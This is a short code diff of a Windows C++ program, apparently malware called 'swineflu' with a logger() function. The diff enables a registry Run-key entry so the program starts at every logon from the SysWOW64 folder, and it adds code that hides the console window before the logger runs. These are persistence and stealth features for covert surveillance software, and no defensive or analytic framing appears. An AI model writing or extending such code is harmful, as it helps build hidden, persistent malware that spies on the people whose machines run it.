@@ -19,9 +19,9 @@ using namespace std;
 
 
 
-int addRunEntry()
+void addRunEntry()
 {
-	//RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
+	RegSetKeyValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, REG_SZ, "C:\\Windows\\SysWOW64\\swineflu.exe", strlen("C:\\Windows\\SysWOW64\\swineflu.exe") + 1);
 }
 
 string ExePath() {
@@ -52,13 +52,18 @@ void adminstartup()
 		printf("okay/n");
 	}
 
+	addRunEntry();
 
-	getchar();
+	
 }
 
 
 int _tmain(int argc, _TCHAR* argv[])
 {
+	HWND stealth; /*creating stealth (window is not visible)*/
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
 	printf("wear your mask please\n");
 	adminstartup();
 	logger();
